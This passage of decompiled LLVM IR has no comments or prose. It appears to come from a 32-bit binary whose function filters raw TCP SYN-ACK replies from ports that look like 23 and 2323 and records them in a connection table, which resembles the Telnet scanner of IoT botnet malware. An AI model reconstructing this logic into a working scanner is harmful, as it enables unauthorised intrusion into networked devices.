  %v2_8050d15 = add i32 %v1_8050d15, -4
  %v3_8050d15 = inttoptr i32 %v2_8050d15 to i32*
  store i32 %v0_8050d15, i32* %v3_8050d15, align 4
  %v0_8050d16 = load i32, i32* @edi, align 4
  %v2_8050d16 = add i32 %v1_8050d15, -8
  %v3_8050d16 = inttoptr i32 %v2_8050d16 to i32*
  store i32 %v0_8050d16, i32* %v3_8050d16, align 4
  %v1_8050d17 = add i32 %v1_8050d15, -12
  %v2_8050d17 = inttoptr i32 %v1_8050d17 to i32*
  store i32 0, i32* %v2_8050d17, align 4
  %v1_8050d19 = add i32 %v1_8050d15, -16
  %v2_8050d19 = inttoptr i32 %v1_8050d19 to i32*
  store i32 0, i32* %v2_8050d19, align 4
  %v1_8050d1b = add i32 %v1_8050d15, -20
  %v2_8050d1b = inttoptr i32 %v1_8050d1b to i32*
  store i32 16384, i32* %v2_8050d1b, align 4
  %v1_8050d20 = add i32 %v1_8050d15, -24
  %v2_8050d20 = inttoptr i32 %v1_8050d20 to i32*
  store i32 1514, i32* %v2_8050d20, align 4
  %v0_8050d25 = load i32, i32* @global_var_805733c.42, align 4
  store i32 %v0_8050d25, i32* %esi.global-to-local, align 4
  %v1_8050d2b = add i32 %v1_8050d15, 58
  store i32 %v1_8050d2b, i32* %edx.global-to-local, align 4
  %v2_8050d2f = add i32 %v1_8050d15, -28
  %v3_8050d2f = inttoptr i32 %v2_8050d2f to i32*
  store i32 %v1_8050d2b, i32* %v3_8050d2f, align 4
  %v0_8050d30 = load i32, i32* %esi.global-to-local, align 4
  %v2_8050d30 = add i32 %v1_8050d15, -32
  %v3_8050d30 = inttoptr i32 %v2_8050d30 to i32*
  store i32 %v0_8050d30, i32* %v3_8050d30, align 4
  %v0_8050d31 = call i32 @function_80532c1()
  store i32 %v0_8050d31, i32* %eax.global-to-local, align 4
  %v0_8050d36 = load i32, i32* @esp, align 4
  %tmp = icmp slt i32 %v0_8050d31, 1
  br i1 %tmp, label %dec_label_pc_8050e20, label %dec_label_pc_8050d41

dec_label_pc_8050d41:                             ; preds = %dec_label_pc_8050d0b
  %v1_8050d41 = add i32 %v0_8050d36, 72
  %v2_8050d41 = inttoptr i32 %v1_8050d41 to i32*
  %v3_8050d41 = load i32, i32* %v2_8050d41, align 4
  store i32 %v3_8050d41, i32* %ecx.global-to-local, align 4
  %v1_8050d45 = inttoptr i32 %v3_8050d41 to i32*
  %v2_8050d45 = load i32, i32* %v1_8050d45, align 4
  %v11_8050d45 = icmp eq i32 %v2_8050d45, 11
  br i1 %v11_8050d45, label %dec_label_pc_8050e20, label %dec_label_pc_8050d4e

dec_label_pc_8050d4e:                             ; preds = %dec_label_pc_8050d41
  %tmp295 = icmp ult i32 %v0_8050d31, 40
  br i1 %tmp295, label %dec_label_pc_8050d0b, label %dec_label_pc_8050d53

dec_label_pc_8050d53:                             ; preds = %dec_label_pc_8050d4e
  %v1_8050d53 = add i32 %v0_8050d36, 106
  %v2_8050d53 = inttoptr i32 %v1_8050d53 to i32*
  %v3_8050d53 = load i32, i32* %v2_8050d53, align 4
  store i32 %v3_8050d53, i32* %eax.global-to-local, align 4
  %v1_8050d57 = load i32, i32* @global_var_805731c.27, align 4
  %v12_8050d57 = icmp eq i32 %v3_8050d53, %v1_8050d57
  %v1_8050d5d = icmp eq i1 %v12_8050d57, false
  br i1 %v1_8050d5d, label %dec_label_pc_8050d0b, label %dec_label_pc_8050d5f

dec_label_pc_8050d5f:                             ; preds = %dec_label_pc_8050d53
  %v1_8050d5f = add i32 %v0_8050d36, 99
  %v2_8050d5f = inttoptr i32 %v1_8050d5f to i8*
  %v3_8050d5f = load i8, i8* %v2_8050d5f, align 1
  %v12_8050d5f = icmp eq i8 %v3_8050d5f, 6
  %v1_8050d64 = icmp eq i1 %v12_8050d5f, false
  br i1 %v1_8050d64, label %dec_label_pc_8050d0b, label %dec_label_pc_8050d66

dec_label_pc_8050d66:                             ; preds = %dec_label_pc_8050d5f
  %v1_8050d66 = add i32 %v0_8050d36, 110
  %v2_8050d66 = inttoptr i32 %v1_8050d66 to i32*
  %v3_8050d66 = load i32, i32* %v2_8050d66, align 4
  store i32 %v3_8050d66, i32* %esi.global-to-local, align 4
  %v1_8050d6a = trunc i32 %v3_8050d66 to i16
  %v7_8050d6a = icmp eq i16 %v1_8050d6a, 5888
  br i1 %v7_8050d6a, label %dec_label_pc_8050d78, label %dec_label_pc_8050d71

dec_label_pc_8050d71:                             ; preds = %dec_label_pc_8050d66
  %v10_8050d71 = icmp eq i16 %v1_8050d6a, 4873
  %v1_8050d76 = icmp eq i1 %v10_8050d71, false
  br i1 %v1_8050d76, label %dec_label_pc_8050d0b, label %dec_label_pc_8050d78

dec_label_pc_8050d78:                             ; preds = %dec_label_pc_8050d71, %dec_label_pc_8050d66
  %v1_8050d78 = add i32 %v0_8050d36, 54
  %v2_8050d78 = inttoptr i32 %v1_8050d78 to i16*
  %v3_8050d78 = load i16, i16* %v2_8050d78, align 2
  %v4_8050d78 = zext i16 %v3_8050d78 to i32
  %v6_8050d78 = and i32 %v3_8050d53, -65536
  %v7_8050d78 = or i32 %v4_8050d78, %v6_8050d78
  store i32 %v7_8050d78, i32* %eax.global-to-local, align 4
  %v3_8050d7d = add i32 %v0_8050d36, 112
  %v4_8050d7d = inttoptr i32 %v3_8050d7d to i16*
  %v5_8050d7d = load i16, i16* %v4_8050d7d, align 2
  %v16_8050d7d = icmp eq i16 %v3_8050d78, %v5_8050d7d
  %v1_8050d82 = icmp eq i1 %v16_8050d7d, false
  br i1 %v1_8050d82, label %dec_label_pc_8050d0b, label %dec_label_pc_8050d84

dec_label_pc_8050d84:                             ; preds = %dec_label_pc_8050d78
  %v1_8050d84 = add i32 %v0_8050d36, 123
  %v2_8050d84 = inttoptr i32 %v1_8050d84 to i8*
  %v3_8050d84 = load i8, i8* %v2_8050d84, align 1
  %v4_8050d84 = zext i8 %v3_8050d84 to i32
  %v6_8050d84 = and i32 %v7_8050d78, -256
  %v7_8050d84 = or i32 %v4_8050d84, %v6_8050d84
  store i32 %v7_8050d84, i32* %eax.global-to-local, align 4
  %v2_8050d88 = and i8 %v3_8050d84, 2
  %v3_8050d88 = icmp eq i8 %v2_8050d88, 0
  br i1 %v3_8050d88, label %dec_label_pc_8050d0b, label %dec_label_pc_8050d90

dec_label_pc_8050d90:                             ; preds = %dec_label_pc_8050d84
  %v2_8050d90 = and i32 %v4_8050d84, 16
  %v3_8050d90 = icmp eq i32 %v2_8050d90, 0
  br i1 %v3_8050d90, label %dec_label_pc_8050d0b, label %dec_label_pc_8050d98

dec_label_pc_8050d98:                             ; preds = %dec_label_pc_8050d90
  %v2_8050d98 = and i32 %v4_8050d84, 4
  %v3_8050d98 = icmp eq i32 %v2_8050d98, 0
  %v1_8050d9a = icmp eq i1 %v3_8050d98, false
  br i1 %v1_8050d9a, label %dec_label_pc_8050d0b, label %dec_label_pc_8050da0

dec_label_pc_8050da0:                             ; preds = %dec_label_pc_8050d98
  %tmp302 = urem i8 %v3_8050d84, 2
  %v3_8050da0 = icmp eq i8 %tmp302, 0
  %v1_8050da2 = icmp eq i1 %v3_8050da0, false
  br i1 %v1_8050da2, label %dec_label_pc_8050d0b, label %dec_label_pc_8050da8

dec_label_pc_8050da8:                             ; preds = %dec_label_pc_8050da0
  %v1_8050da8 = add i32 %v0_8050d36, 118
  %v2_8050da8 = inttoptr i32 %v1_8050da8 to i32*
  %v3_8050da8 = load i32, i32* %v2_8050da8, align 4
  %v1_8050dac = trunc i32 %v3_8050da8 to i16
  %v2_8050dac = call i16 @llvm.bswap.i16(i16 %v1_8050dac)
  %v3_8050dac = zext i16 %v2_8050dac to i32
  %v1_8050db0 = udiv i32 %v3_8050da8, 65536
  %v2_8050db0 = mul nuw i32 %v3_8050dac, 65536
  %v1_8050db3 = trunc i32 %v1_8050db0 to i16
  %v2_8050db3 = call i16 @llvm.bswap.i16(i16 %v1_8050db3)
  %v3_8050db3 = zext i16 %v2_8050db3 to i32
  %v6_8050db3 = or i32 %v3_8050db3, %v2_8050db0
  store i32 %v6_8050db3, i32* %eax.global-to-local, align 4
  %v1_8050db7 = add i32 %v6_8050db3, -1
  %v1_8050dba = trunc i32 %v1_8050db7 to i16
  %v2_8050dba = call i16 @llvm.bswap.i16(i16 %v1_8050dba)
  %v3_8050dba = zext i16 %v2_8050dba to i32
  %v1_8050dbe = udiv i32 %v1_8050db7, 65536
  %v2_8050dbe = mul nuw i32 %v3_8050dba, 65536
  %v1_8050dc1 = trunc i32 %v1_8050dbe to i16
  %v2_8050dc1 = call i16 @llvm.bswap.i16(i16 %v1_8050dc1)
  %v3_8050dc1 = zext i16 %v2_8050dc1 to i32
  %v6_8050dc1 = or i32 %v3_8050dc1, %v2_8050dbe
  store i32 %v6_8050dc1, i32* %edx.global-to-local, align 4
  %v1_8050dc5 = add i32 %v0_8050d36, 102
  %v2_8050dc5 = inttoptr i32 %v1_8050dc5 to i32*
  %v3_8050dc5 = load i32, i32* %v2_8050dc5, align 4
  %v15_8050dc5 = icmp eq i32 %v3_8050dc5, %v6_8050dc1
  %v1_8050dc9 = icmp eq i1 %v15_8050dc5, false
  br i1 %v1_8050dc9, label %dec_label_pc_8050d0b, label %dec_label_pc_8050dcf

dec_label_pc_8050dcf:                             ; preds = %dec_label_pc_8050da8
  %v0_8050dcf = load i32, i32* @ebx, align 4
  %v1_8050dcf = add i32 %v0_8050dcf, -255
  %v6_8050dcf = sub i32 254, %v0_8050dcf
  %v7_8050dcf = and i32 %v6_8050dcf, %v0_8050dcf
  %v8_8050dcf = icmp slt i32 %v7_8050dcf, 0
  %v9_8050dcf = icmp eq i32 %v1_8050dcf, 0
  %v10_8050dcf = icmp slt i32 %v1_8050dcf, 0
  %v3_8050dd5 = icmp eq i1 %v10_8050dcf, %v8_8050dcf
  %v4_8050dd5 = icmp eq i1 %v9_8050dcf, false
  %v5_8050dd5 = and i1 %v4_8050dd5, %v3_8050dd5
  br i1 %v5_8050dd5, label %dec_label_pc_8050e20, label %dec_label_pc_8050dd7

dec_label_pc_8050dd7:                             ; preds = %dec_label_pc_8050dcf
  %v0_8050dda = load i32, i32* @global_var_8057338.45, align 8
  store i32 %v0_8050dda, i32* %ecx.global-to-local, align 4
  %v2_8050de0 = mul i32 %v0_8050dcf, 288
  %v2_8050de3 = add i32 %v0_8050dda, %v2_8050de0
  store i32 %v2_8050de3, i32* @eax, align 4
  %v1_8050de5 = add i32 %v2_8050de3, 12
  %v2_8050de5 = inttoptr i32 %v1_8050de5 to i32*
  %v3_8050de5 = load i32, i32* %v2_8050de5, align 4
  %v1_8050de8 = add i32 %v2_8050de3, 288
  store i32 %v1_8050de8, i32* %ecx.global-to-local, align 4
  %v1_8050dee = icmp eq i32 %v3_8050de5, 0
  br i1 %v1_8050dee, label %dec_label_pc_8050e0a, label %dec_label_pc_8050df2

dec_label_pc_8050df2:                             ; preds = %dec_label_pc_8050dd7, %dec_label_pc_8050dfb
  %v0_8050dfb = phi i32 [ %v1_8050dfd, %dec_label_pc_8050dfb ], [ %v1_8050de8, %dec_label_pc_8050dd7 ]
  %v0_8050df2 = phi i32 [ %v1_8050df2, %dec_label_pc_8050dfb ], [ %v0_8050dcf, %dec_label_pc_8050dd7 ]
  %v1_8050df2 = add i32 %v0_8050df2, 1
  store i32 %v1_8050df2, i32* @ebx, align 4
  %v6_8050df3 = icmp eq i32 %v0_8050df2, 255
  br i1 %v6_8050df3, label %dec_label_pc_8050e20.loopexit, label %dec_label_pc_8050dfb

dec_label_pc_8050dfb:                             ; preds = %dec_label_pc_8050df2
  store i32 %v0_8050dfb, i32* @eax, align 4
  %v1_8050dfd = add i32 %v0_8050dfb, 288
  store i32 %v1_8050dfd, i32* %ecx.global-to-local, align 4
  %v1_8050e03 = add i32 %v0_8050dfb, 12
  %v2_8050e03 = inttoptr i32 %v1_8050e03 to i32*
  %v3_8050e03 = load i32, i32* %v2_8050e03, align 4
  store i32 %v3_8050e03, i32* @edi, align 4
  %v1_8050e06 = icmp eq i32 %v3_8050e03, 0
  %v1_8050e08 = icmp eq i1 %v1_8050e06, false
  br i1 %v1_8050e08, label %dec_label_pc_8050df2, label %dec_label_pc_8050e0a.loopexit

dec_label_pc_8050e0a.loopexit:                    ; preds = %dec_label_pc_8050dfb
  br label %dec_label_pc_8050e0a

dec_label_pc_8050e0a:                             ; preds = %dec_label_pc_8050e0a.loopexit, %dec_label_pc_8050dd7
  %v1_8050e0a = phi i32 [ %v0_8050dfb, %dec_label_pc_8050e0a.loopexit ], [ %v2_8050de3, %dec_label_pc_8050dd7 ]
  %v2_8050e0a = add i32 %v1_8050e0a, 16
  %v3_8050e0a = inttoptr i32 %v2_8050e0a to i32*
  store i32 %v6_8050dc1, i32* %v3_8050e0a, align 4
  %v0_8050e0d = load i32, i32* %esi.global-to-local, align 4
  %v1_8050e0d = trunc i32 %v0_8050e0d to i16
  %v2_8050e0d = load i32, i32* @eax, align 4
  %v3_8050e0d = add i32 %v2_8050e0d, 20
  %v4_8050e0d = inttoptr i32 %v3_8050e0d to i16*
  store i16 %v1_8050e0d, i16* %v4_8050e0d, align 2
  %v0_8050e11 = call i32 @function_80501d0()
  store i32 %v0_8050e11, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050d0b

dec_label_pc_8050e20.loopexit:                    ; preds = %dec_label_pc_8050df2
  br label %dec_label_pc_8050e20

dec_label_pc_8050e20:                             ; preds = %dec_label_pc_8050dcf, %dec_label_pc_8050d41, %dec_label_pc_8050d0b, %dec_label_pc_8050e20.loopexit
  store i32 32, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 32, i32* %ecx.global-to-local, align 4
  %v1_8050e29 = add i32 %v0_8050d36, 44
  %v2_8050e29 = inttoptr i32 %v1_8050e29 to i32*
  %v3_8050e29 = load i32, i32* %v2_8050e29, align 4
  %v4_8050e29 = inttoptr i32 %v3_8050e29 to i8*
  %v5_8050e2e = call i8* @_memset(i8* %v4_8050e29, i32 0, i32 32)
  %v0_8050e30 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8050e30, i32* %ecx.global-to-local, align 4
  %v0_8050e32 = load i32, i32* @esp, align 4
  %v1_8050e32 = add i32 %v0_8050e32, 8
  %v2_8050e32 = inttoptr i32 %v1_8050e32 to i32*
  %v3_8050e32 = load i32, i32* %v2_8050e32, align 4
  %v4_8050e32 = inttoptr i32 %v3_8050e32 to i8*
  store i1 false, i1* @df, align 1
  %v2_8050e37 = load i32, i32* %eax.global-to-local, align 4
  %v5_8050e37 = call i8* @_memset(i8* %v4_8050e32, i32 %v2_8050e37, i32 %v0_8050e30)
  %v6_8050e37 = ptrtoint i8* %v5_8050e37 to i32
  store i32 %v6_8050e37, i32* %ecx.global-to-local, align 4
  store i32 0, i32* @edi, align 4
  %v0_8050e3b = load i32, i32* @esp, align 4
  %v1_8050e3b = add i32 %v0_8050e3b, 1868
  %v2_8050e3b = inttoptr i32 %v1_8050e3b to i32*
  store i32 0, i32* %v2_8050e3b, align 4
  store i32 0, i32* @esi, align 4
  %v0_8050e48.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050e48

dec_label_pc_8050e48:                             ; preds = %dec_label_pc_8050e9b, %dec_label_pc_8050e20
  %v0_8050e48 = phi i32 [ %v0_8050eaa, %dec_label_pc_8050e9b ], [ %v0_8050e48.pre, %dec_label_pc_8050e20 ]
  %v0_8050e4b = load i32, i32* @global_var_8057338.45, align 8
  store i32 %v0_8050e4b, i32* %eax.global-to-local, align 4
  %v2_8050e50 = mul i32 %v0_8050e48, 288
  store i32 30, i32* %ecx.global-to-local, align 4
  %v2_8050e58 = add i32 %v0_8050e4b, %v2_8050e50
  store i32 %v2_8050e58, i32* @ebx, align 4
  %v1_8050e5a = add i32 %v2_8050e58, 12
  %v2_8050e5a = inttoptr i32 %v1_8050e5a to i32*
  %v3_8050e5a = load i32, i32* %v2_8050e5a, align 4
  store i32 %v3_8050e5a, i32* %edx.global-to-local, align 4
  %v1_8050e5d = add i32 %v3_8050e5a, -1
  %v5_8050e5d = icmp eq i32 %v3_8050e5a, 0
  %v9_8050e5d = icmp eq i32 %v1_8050e5d, 0
  %v2_8050e60 = or i1 %v5_8050e5d, %v9_8050e5d
  br i1 %v2_8050e60, label %dec_label_pc_8051a02, label %dec_label_pc_8050e66

dec_label_pc_8050e66:                             ; preds = %dec_label_pc_8050e48, %dec_label_pc_8051a0a
  %v1_8050e70 = phi i32 [ 30, %dec_label_pc_8050e48 ], [ 5, %dec_label_pc_8051a0a ]
  %v0_8050e66 = load i32, i32* @global_var_80572f0.34, align 16
  store i32 %v0_8050e66, i32* %eax.global-to-local, align 4
  %v1_8050e6b = add i32 %v2_8050e58, 8
  %v2_8050e6b = inttoptr i32 %v1_8050e6b to i32*
  %v3_8050e6b = load i32, i32* %v2_8050e6b, align 4
  %v2_8050e6e = sub i32 %v0_8050e66, %v3_8050e6b
  store i32 %v2_8050e6e, i32* %eax.global-to-local, align 4
  %tmp296 = icmp ugt i32 %v2_8050e6e, %v1_8050e70
  br i1 %tmp296, label %dec_label_pc_80519a0, label %dec_label_pc_8050e78

dec_label_pc_8050e78:                             ; preds = %dec_label_pc_8050e66
  store i32 %v1_8050e5d, i32* %edx.global-to-local, align 4
  %v1_8051975 = add i32 %v2_8050e58, 4
  %v2_8051975 = inttoptr i32 %v1_8051975 to i32*
  %v3_8051975 = load i32, i32* %v2_8051975, align 4
  %v1_805197a = urem i32 %v3_8051975, 32
  store i32 %v1_805197a, i32* %eax.global-to-local, align 4
  %v2_805197d = udiv i32 %v3_8051975, 32
  store i32 %v2_805197d, i32* %edx.global-to-local, align 4
  %v0_8051980 = load i32, i32* @esp, align 4
  %v2_8051980 = mul nuw nsw i32 %v2_805197d, 4
  br i1 %v9_8050e5d, label %dec_label_pc_8051975, label %dec_label_pc_8050e7f

dec_label_pc_8050e7f:                             ; preds = %dec_label_pc_8050e78
  %v3_8050e8a = add nuw nsw i32 %v2_8051980, 1700
  %v4_8050e8a = add i32 %v3_8050e8a, %v0_8051980
  %v5_8050e8a = inttoptr i32 %v4_8050e8a to i32*
  %v6_8050e8a = load i32, i32* %v5_8050e8a, align 4
  %v9_8050e8a = shl i32 1, %v1_805197a
  %v12_8050e8a = or i32 %v6_8050e8a, %v9_8050e8a
  store i32 %v12_8050e8a, i32* %v5_8050e8a, align 4
  %v0_8050e92 = load i32, i32* @ebx, align 4
  %v1_8050e92 = add i32 %v0_8050e92, 4
  %v2_8050e92 = inttoptr i32 %v1_8050e92 to i32*
  %v3_8050e92 = load i32, i32* %v2_8050e92, align 4
  store i32 %v3_8050e92, i32* %eax.global-to-local, align 4
  %v0_8050e95 = load i32, i32* @edi, align 4
  %v2_8050e95 = sub i32 %v0_8050e95, %v3_8050e92
  %v8_8050e95 = xor i32 %v0_8050e95, %v3_8050e92
  %v9_8050e95 = xor i32 %v2_8050e95, %v0_8050e95
  %v10_8050e95 = and i32 %v9_8050e95, %v8_8050e95
  %v11_8050e95 = icmp slt i32 %v10_8050e95, 0
  %v13_8050e95 = icmp slt i32 %v2_8050e95, 0
  %v2_8050e97 = icmp eq i1 %v13_8050e95, %v11_8050e95
  br i1 %v2_8050e97, label %dec_label_pc_8050e9b, label %dec_label_pc_8050e99

dec_label_pc_8050e99:                             ; preds = %dec_label_pc_8050e7f
  store i32 %v3_8050e92, i32* @edi, align 4
  br label %dec_label_pc_8050e9b

dec_label_pc_8050e9b:                             ; preds = %dec_label_pc_8051a02, %dec_label_pc_8051975, %dec_label_pc_8050e7f, %dec_label_pc_80519ef, %dec_label_pc_80519cd, %dec_label_pc_8051993, %dec_label_pc_8050e99
  %v0_8050e9b = load i32, i32* @esp, align 4
  %v1_8050e9b = add i32 %v0_8050e9b, 1868
  %v2_8050e9b = inttoptr i32 %v1_8050e9b to i32*
  %v3_8050e9b = load i32, i32* %v2_8050e9b, align 4
  %v1_8050ea2 = add i32 %v3_8050e9b, 1
  store i32 %v1_8050ea2, i32* %eax.global-to-local, align 4
  store i32 %v1_8050ea2, i32* %v2_8050e9b, align 4
  %v0_8050eaa = load i32, i32* %eax.global-to-local, align 4
  %v1_8050eaa = add i32 %v0_8050eaa, -255
  %v6_8050eaa = sub i32 254, %v0_8050eaa
  %v7_8050eaa = and i32 %v6_8050eaa, %v0_8050eaa
  %v8_8050eaa = icmp slt i32 %v7_8050eaa, 0
  %v9_8050eaa = icmp eq i32 %v1_8050eaa, 0
  %v10_8050eaa = icmp slt i32 %v1_8050eaa, 0
  %v3_8050eaf = icmp ne i1 %v10_8050eaa, %v8_8050eaa
  %v4_8050eaf = or i1 %v9_8050eaa, %v3_8050eaf
  br i1 %v4_8050eaf, label %dec_label_pc_8050e48, label %dec_label_pc_8050eb1

dec_label_pc_8050eb1:                             ; preds = %dec_label_pc_8050e9b
  %v0_8050eb1 = load i32, i32* @esp, align 4
  %v1_8050eb1 = add i32 %v0_8050eb1, 1860
  %v2_8050eb1 = inttoptr i32 %v1_8050eb1 to i32*
  store i32 0, i32* %v2_8050eb1, align 4
  %v0_8050ebc = load i32, i32* @esp, align 4
  %v1_8050ebc = add i32 %v0_8050ebc, 1856
  %v2_8050ebc = inttoptr i32 %v1_8050ebc to i32*
  store i32 1, i32* %v2_8050ebc, align 4
  %v0_8050ec7 = load i32, i32* @esp, align 4
  %v0_8050eca = load i32, i32* @edi, align 4
  %v1_8050eca = load i32, i32* @esi, align 4
  %v2_8050eca = sub i32 %v0_8050eca, %v1_8050eca
  %v8_8050eca = xor i32 %v1_8050eca, %v0_8050eca
  %v9_8050eca = xor i32 %v2_8050eca, %v0_8050eca
  %v10_8050eca = and i32 %v9_8050eca, %v8_8050eca
  %v11_8050eca = icmp slt i32 %v10_8050eca, 0
  %v13_8050eca = icmp slt i32 %v2_8050eca, 0
  %v1_8050ecc = add i32 %v0_8050ec7, 1856
  %v2_8050ed3 = add i32 %v0_8050ec7, -16
  %v3_8050ed3 = inttoptr i32 %v2_8050ed3 to i32*
  store i32 %v1_8050ecc, i32* %v3_8050ed3, align 4
  %v1_8050ed4 = add i32 %v0_8050ec7, -20
  %v2_8050ed4 = inttoptr i32 %v1_8050ed4 to i32*
  store i32 0, i32* %v2_8050ed4, align 4
  %v1_8050ed6 = add i32 %v0_8050ec7, 1572
  store i32 %v1_8050ed6, i32* %edx.global-to-local, align 4
  %v0_8050edd = load i32, i32* @edi, align 4
  store i32 %v0_8050edd, i32* %eax.global-to-local, align 4
  %v2_8050edf = add i32 %v0_8050ec7, -24
  %v3_8050edf = inttoptr i32 %v2_8050edf to i32*
  store i32 %v1_8050ed6, i32* %v3_8050edf, align 4
  %v1_8050ee0 = add i32 %v0_8050ec7, 1700
  store i32 %v1_8050ee0, i32* %ecx.global-to-local, align 4
  %v2_8050ee7 = add i32 %v0_8050ec7, -28
  %v3_8050ee7 = inttoptr i32 %v2_8050ee7 to i32*
  store i32 %v1_8050ee0, i32* %v3_8050ee7, align 4
  %v2_8050ee8 = icmp eq i1 %v13_8050eca, %v11_8050eca
  br i1 %v2_8050ee8, label %dec_label_pc_8050eb1.dec_label_pc_8050eec_crit_edge, label %dec_label_pc_8050eea

dec_label_pc_8050eb1.dec_label_pc_8050eec_crit_edge: ; preds = %dec_label_pc_8050eb1
  %v0_8050eec.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050eec

dec_label_pc_8050eea:                             ; preds = %dec_label_pc_8050eb1
  %v0_8050eea = load i32, i32* @esi, align 4
  store i32 %v0_8050eea, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050eec

dec_label_pc_8050eec:                             ; preds = %dec_label_pc_8050eb1.dec_label_pc_8050eec_crit_edge, %dec_label_pc_8050eea
  %v0_8050eec = phi i32 [ %v0_8050eec.pre, %dec_label_pc_8050eb1.dec_label_pc_8050eec_crit_edge ], [ %v0_8050eea, %dec_label_pc_8050eea ]
  %v1_8050eec = add i32 %v0_8050eec, 1
  store i32 %v1_8050eec, i32* %eax.global-to-local, align 4
  %v2_8050eed = add i32 %v0_8050ec7, -32
  %v3_8050eed = inttoptr i32 %v2_8050eed to i32*
  store i32 %v1_8050eec, i32* %v3_8050eed, align 4
  %v0_8050eee = call i32 @function_8052dc8()
  store i32 %v0_8050eee, i32* %eax.global-to-local, align 4
  %v0_8050ef3 = load i32, i32* @esp, align 4
  %v1_8050ef6 = add i32 %v0_8050ef3, 16
  %v2_8050ef6 = inttoptr i32 %v1_8050ef6 to i32*
  store i32 0, i32* %v2_8050ef6, align 4
  %v2_8050ef8 = call i32 @function_8052e82(i32* nonnull @0)
  %v0_8050efd = load i32, i32* @esp, align 4
  %v1_8050efd = add i32 %v0_8050efd, 1884
  %v2_8050efd = inttoptr i32 %v1_8050efd to i32*
  store i32 0, i32* %v2_8050efd, align 4
  store i32 %v2_8050ef8, i32* @global_var_80572f0.34, align 16
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050f12

dec_label_pc_8050f12:                             ; preds = %dec_label_pc_8050f5b, %dec_label_pc_8050eec
  %v0_8050f12 = phi i32 [ %v0_8050f6a, %dec_label_pc_8050f5b ], [ 0, %dec_label_pc_8050eec ]
  %v0_8050f15 = load i32, i32* @global_var_8057338.45, align 8
  store i32 %v0_8050f15, i32* %eax.global-to-local, align 4
  %v2_8050f1a = mul i32 %v0_8050f12, 288
  %v2_8050f1d = add i32 %v0_8050f15, %v2_8050f1a
  store i32 %v2_8050f1d, i32* @edi, align 4
  %v1_8050f1f = add i32 %v2_8050f1d, 4
  %v2_8050f1f = inttoptr i32 %v1_8050f1f to i32*
  %v3_8050f1f = load i32, i32* %v2_8050f1f, align 4
  store i32 %v3_8050f1f, i32* %ecx.global-to-local, align 4
  %v10_8050f22 = icmp eq i32 %v3_8050f1f, -1
  br i1 %v10_8050f22, label %dec_label_pc_8050f5b, label %dec_label_pc_8050f27

dec_label_pc_8050f27:                             ; preds = %dec_label_pc_8050f12
  %v2_8050f2b = udiv i32 %v3_8050f1f, 32
  store i32 %v2_8050f2b, i32* %edx.global-to-local, align 4
  %v1_8050f2e = urem i32 %v3_8050f1f, 32
  store i32 %v1_8050f2e, i32* %eax.global-to-local, align 4
  %v0_8050f31 = load i32, i32* @esp, align 4
  %v2_8050f31 = mul nuw nsw i32 %v2_8050f2b, 4
  %v3_8050f31 = add nuw nsw i32 %v2_8050f31, 1572
  %v4_8050f31 = add i32 %v3_8050f31, %v0_8050f31
  %v5_8050f31 = inttoptr i32 %v4_8050f31 to i32*
  %v6_8050f31 = load i32, i32* %v5_8050f31, align 4
  %v9_8050f31 = shl i32 1, %v1_8050f2e
  %v10_8050f31 = and i32 %v6_8050f31, %v9_8050f31
  %v11_8050f31 = icmp ne i32 %v10_8050f31, 0
  %v1_8050f39 = zext i1 %v11_8050f31 to i32
  store i32 %v1_8050f39, i32* %eax.global-to-local, align 4
  %v4_8050f3c = icmp eq i1 %v11_8050f31, false
  %v1_8050f3e = icmp eq i1 %v4_8050f3c, false
  br i1 %v1_8050f3e, label %dec_label_pc_80518ab, label %dec_label_pc_8050f44

dec_label_pc_8050f44:                             ; preds = %dec_label_pc_8050f27, %dec_label_pc_805193b
  %v0_8050f4c = phi i32 [ %v0_8050f31, %dec_label_pc_8050f27 ], [ %v0_8050f4c.pre, %dec_label_pc_805193b ]
  %v0_8050f44 = phi i32 [ %v3_8050f1f, %dec_label_pc_8050f27 ], [ %v0_8050f44.pre, %dec_label_pc_805193b ]
  %v2_8050f46 = udiv i32 %v0_8050f44, 32
  store i32 %v2_8050f46, i32* %ecx.global-to-local, align 4
  %v1_8050f49 = urem i32 %v0_8050f44, 32
  store i32 %v1_8050f49, i32* %eax.global-to-local, align 4
  %v2_8050f4c = mul nuw nsw i32 %v2_8050f46, 4
  %v3_8050f4c = add i32 %v0_8050f4c, 1700
  %v4_8050f4c = add i32 %v3_8050f4c, %v2_8050f4c
  %v5_8050f4c = inttoptr i32 %v4_8050f4c to i32*
  %v6_8050f4c = load i32, i32* %v5_8050f4c, align 4
  %v9_8050f4c = shl i32 1, %v1_8050f49
  %v10_8050f4c = and i32 %v6_8050f4c, %v9_8050f4c
  %v11_8050f4c = icmp ne i32 %v10_8050f4c, 0
  %v1_8050f54 = zext i1 %v11_8050f4c to i32
  store i32 %v1_8050f54, i32* %eax.global-to-local, align 4
  %v4_8050f57 = icmp eq i1 %v11_8050f4c, false
  %v1_8050f59 = icmp eq i1 %v4_8050f57, false
  br i1 %v1_8050f59, label %dec_label_pc_8050fb2.preheader, label %dec_label_pc_8050f5b

dec_label_pc_8050fb2.preheader:                   ; preds = %dec_label_pc_8050f44
  %v0_8050fb227 = load i32, i32* @edi, align 4
  %v1_8050fb228 = add i32 %v0_8050fb227, 12
  %v2_8050fb229 = inttoptr i32 %v1_8050fb228 to i32*
  %v3_8050fb230 = load i32, i32* %v2_8050fb229, align 4
  store i32 %v3_8050fb230, i32* %eax.global-to-local, align 4
  %v1_8050fb531 = icmp eq i32 %v3_8050fb230, 0
  br i1 %v1_8050fb531, label %dec_label_pc_8050f5b, label %dec_label_pc_8050fb9

dec_label_pc_8050f5b:                             ; preds = %dec_label_pc_8050fb2.backedge, %dec_label_pc_8050fb2.preheader, %dec_label_pc_805151b, %dec_label_pc_8050f44, %dec_label_pc_8050f12, %dec_label_pc_8051a27, %dec_label_pc_805194c, %dec_label_pc_8051553
  %v0_8050f5b = load i32, i32* @esp, align 4
  %v1_8050f5b = add i32 %v0_8050f5b, 1868
  %v2_8050f5b = inttoptr i32 %v1_8050f5b to i32*
  %v3_8050f5b = load i32, i32* %v2_8050f5b, align 4
  %v1_8050f62 = add i32 %v3_8050f5b, 1
